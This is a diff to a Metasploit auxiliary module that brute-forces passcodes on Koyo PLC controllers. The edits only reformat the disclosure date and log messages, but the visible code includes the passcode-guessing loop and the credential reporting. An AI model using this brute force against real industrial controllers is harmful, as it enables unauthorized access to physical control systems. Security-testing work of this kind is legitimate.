@@ -27,7 +27,7 @@ class MetasploitModule < Msf::Auxiliary
         'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
         'todb' # Metasploit fixups
       ],
-      'DisclosureDate' => '2012-01-19',
+      'DisclosureDate' => 'Jan 19 2012',
       'License' => MSF_LICENSE,
       'References' => [
         [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
@@ -87,14 +87,14 @@ class MetasploitModule < Msf::Auxiliary
     )
     add_socket(@udp_sock)
 
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - KOYO - Checking the controller for locked memory...")
+    print_status("KOYO - Checking the controller for locked memory...")
 
     if unlock_check
       # TODO: Report a vulnerability for an unlocked controller?
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Unlocked!")
+      print_good("Unlocked!")
       return
     else
-      print_status("#{Rex::Socket.to_authority(rhost, rport)} - KOYO - Controller locked; commencing bruteforce...")
+      print_status("KOYO - Controller locked; commencing bruteforce...")
     end
 
     # TODO: Consider sort_by {rand} in order to avoid sequential guessing
@@ -102,13 +102,13 @@ class MetasploitModule < Msf::Auxiliary
 
     (0..9999999).each do |i|
       passcode = datastore['PREFIX'] + i.to_s.rjust(7, '0')
-      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - KOYO - Trying #{passcode}")
+      vprint_status("KOYO - Trying #{passcode}")
       bytes = passcode.scan(/../).map { |x| x.to_i(16) }
       passstr = bytes.pack("C*")
       res = try_auth(passstr)
       next if not res
 
-      print_good "#{Rex::Socket.to_authority(rhost, rport)} - KOYO - Found passcode: #{passcode}"
+      print_good "KOYO - Found passcode: #{passcode}"
       report_cred(
         ip: rhost,
         port: rport.to_i,
